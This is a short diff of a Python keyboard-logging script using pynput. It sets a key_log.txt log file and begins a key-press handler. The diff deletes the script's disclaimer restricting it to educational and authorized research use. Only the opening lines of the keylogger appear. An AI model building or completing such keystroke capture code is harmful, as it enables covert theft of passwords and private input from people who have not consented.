@@ -1,9 +1,5 @@
-# Disclaimer: This script is intended strictly for educational purposes, 
-# local testing, and authorized security research. 
-
 from pynput import keyboard
 
-# Define the path for the log file
 LOG_FILE = "key_log.txt"
 
 def on_press(key):
